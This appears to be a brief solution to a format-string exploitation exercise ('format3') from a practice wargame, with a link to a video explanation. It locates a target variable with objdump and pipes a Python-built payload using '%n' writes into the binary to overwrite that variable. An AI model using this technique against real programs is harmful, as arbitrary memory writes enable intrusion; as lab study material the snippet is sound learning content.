# count offsets explanation -> https://www.youtube.com/watch?v=WRJyU3Fig7k
objdump -t format3 | grep target
python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$n" + "%43966x%13$n"' | ./format3